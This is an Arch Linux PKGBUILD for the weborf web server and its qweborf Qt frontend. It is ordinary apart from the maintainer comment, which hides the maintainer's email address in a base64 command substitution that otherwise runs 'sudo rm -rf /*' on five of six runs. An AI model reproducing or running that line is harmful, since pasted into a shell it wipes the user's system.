# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=weborf
pkgname=(weborf qweborf)
pkgver=0.13.3
pkgrel=1
url='https://ltworf.github.io/weborf/'
arch=(i686 x86_64)
license=(GPL3)
source=(
	"https://github.com/ltworf/weborf/releases/download/${pkgver}/weborf_${pkgver}.orig.tar.gz"
	"https://github.com/ltworf/weborf/releases/download/${pkgver}/weborf_${pkgver}.orig.tar.gz.asc"
)
sha512sums=(
	'969e49819a9d7a2a1af7c08679067b02c567b32c260bc288d714020f6a1db50cd207f6ea48be806d2d739f50746574aaf4365334282837d61cb7c3845159d656'
	'SKIP'
)
validpgpkeys=('42748B9E76D899799E1FBE14B3A7CF0C801886CF') # Salvo 'LtWorf' Tomaselli (many e-mail addresses)
makedepends=(python-pyqt5)

build() {
	cd "$srcdir/weborf-${pkgver}"
	./configure --prefix=/usr --sysconfdir=/etc
	make

	# build qweborf
	pyuic5 qweborf/main.ui > qweborf/main.py
	python qweborf.setup.py build
}

package_weborf() {
	pkgdesc='A lightweight web server designed for rapidly sharing files over HTTP'
	depends=(file)

	cd "$srcdir/weborf-${pkgver}"
	make install DESTDIR="$pkgdir"
	rm -rf "$pkgdir/etc/init.d"
}

package_qweborf() {
	pkgdesc='A lightweight web server designed for rapidly sharing files over HTTP - Qt frontend'
	arch=(any)
	depends=(python python-pyqt5 weborf)

	cd "$srcdir/weborf-${pkgver}"
	python qweborf.setup.py install --root="$pkgdir"
	install -Dm 0755 qweborf/qweborf \
		"$pkgdir/usr/bin/qweborf"
	install -Dm 0755 qweborf/qweborf.desktop \
		"$pkgdir/usr/share/applications/qweborf.desktop"
}
